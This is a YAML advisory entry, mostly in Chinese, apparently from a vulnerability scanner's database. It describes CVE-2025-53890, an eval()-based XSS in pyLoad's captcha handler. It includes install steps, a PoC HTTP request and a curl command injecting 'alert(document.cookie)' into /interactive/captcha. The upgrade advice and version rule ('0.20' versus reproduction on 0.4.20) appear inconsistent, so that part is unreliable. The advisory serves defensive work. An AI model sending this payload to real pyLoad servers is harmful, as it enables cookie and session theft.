info:
  name: pyload-ng
  cve: CVE-2025-53890
  summary: pyLoad 容易受到通过不安全的验证码处理导致的 XSS 攻击，允许未经身份验证的远程攻击者执行任意代码。
  details: |
    该漏洞存在于 pyLoad 的验证码处理代码中，特别是 `onCaptchaResult()` 函数，它直接对攻击者控制的输入使用 `eval()`，而没有进行净化。这允许未经身份验证的远程攻击者在客户端浏览器中执行任意 JavaScript，可能导致会话劫持、凭据窃取，如果环境支持（例如 NodeJS），甚至可能导致完全的系统远程代码执行。
    
    受影响的代码位于 `src/pyload/webui/app/static/js/captcha-interactive.user.js`。
    
    **重现方法：**
    1. **官方源安装**：
    ```bash
    git clone https://github.com/pyload/pyload
    cd pyload
    git checkout 0.4.20
    python -m pip install -e .
    pyload --userdir=/tmp/pyload
    ```
    2. **虚拟环境**：
    ```bash
    python -m venv pyload-env
    source pyload-env/bin/activate
    pip install pyload==0.4.20
    pyload
    ```
    
    **验证码端点验证：**
    受影响的端点是 `/interactive/captcha`。
    
    **完整的 PoC 请求：**
    ```http
    POST /interactive/captcha HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    
    cid=123&response=1%3Balert(document.cookie)
    ```
    
    **Curl 命令修正：**
    ```bash
    curl -X POST "http://localhost:8000/interactive/captcha" \
      -d "cid=123&response=1%3Balert(document.cookie)"
    ```
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. 将 pyLoad 升级到 0.20 或更高版本。
    2. 在处理验证码结果之前，实施适当的输入净化和验证。
    3. 避免对不受信任或用户控制的输入使用 `eval()`。
  references:
    - https://github.com/pyload/pyload/security/advisories/GHSA-8w3f-4r8f-pf53
    - https://nvd.nist.gov/vuln/detail/CVE-2025-53890
    - https://github.com/pyload/pyload/pull/4586
    - https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546
    - https://github.com/pyload/pyload
    - https://cheatsheetseries.owasp.org/cheatsheets/JavaScript_Security_Cheat_Sheet.html#eval
rule: version < "0.20"